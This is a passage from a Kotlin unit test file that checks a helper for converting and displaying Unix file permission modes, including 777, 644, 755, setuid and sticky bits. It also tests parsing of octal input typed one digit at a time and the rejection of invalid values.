        assertTrue(PosixFileModeBit.OTHERS_EXECUTE in bits)

        assertEquals(octal777, MtPermissionsHelper.modeToInt(bits))
        assertEquals("777", MtPermissionsHelper.formatOctal(octal777))
        assertEquals("rwxrwxrwx", MtPermissionsHelper.formatSymbolic(bits))
        assertEquals("777 (rwxrwxrwx)", MtPermissionsHelper.formatDisplay(bits))
    }

    @Test
    fun testCommonModes644And755AndSpecialBits() {
        val mode644 = MtPermissionsHelper.modeFromInt("644".toInt(8))
        assertEquals("644 (rw-r--r--)", MtPermissionsHelper.formatDisplay(mode644))

        val mode755 = MtPermissionsHelper.modeFromInt("755".toInt(8))
        assertEquals("755 (rwxr-xr-x)", MtPermissionsHelper.formatDisplay(mode755))

        val mode4755 = MtPermissionsHelper.modeFromInt("4755".toInt(8))
        assertEquals("4755 (rwsr-xr-x)", MtPermissionsHelper.formatDisplay(mode4755))

        val mode1777 = MtPermissionsHelper.modeFromInt("1777".toInt(8))
        assertEquals("1777 (rwxrwxrwt)", MtPermissionsHelper.formatDisplay(mode1777))
    }

    @Test
    fun testProgressiveOctalTypingWithoutTruncation() {
        // Simulates typing '7', '7', '7' sequentially in octalEdit
        val step1 = MtPermissionsHelper.parseOctalInput("7")
        assertEquals(7, step1)
        assertEquals("------rwx", MtPermissionsHelper.formatSymbolic(MtPermissionsHelper.modeFromInt(step1!!)))

        val step2 = MtPermissionsHelper.parseOctalInput("77")
        assertEquals(63, step2)
        assertEquals("---rwxrwx", MtPermissionsHelper.formatSymbolic(MtPermissionsHelper.modeFromInt(step2!!)))

        val step3 = MtPermissionsHelper.parseOctalInput("777")
        assertEquals(511, step3)
        assertEquals("rwxrwxrwx", MtPermissionsHelper.formatSymbolic(MtPermissionsHelper.modeFromInt(step3!!)))

        // Invalid octal inputs
        assertNull(MtPermissionsHelper.parseOctalInput(""))
        assertNull(MtPermissionsHelper.parseOctalInput("888"))
        assertNull(MtPermissionsHelper.parseOctalInput("797"))
        assertNull(MtPermissionsHelper.parseOctalInput("77777"))
    }
}
```
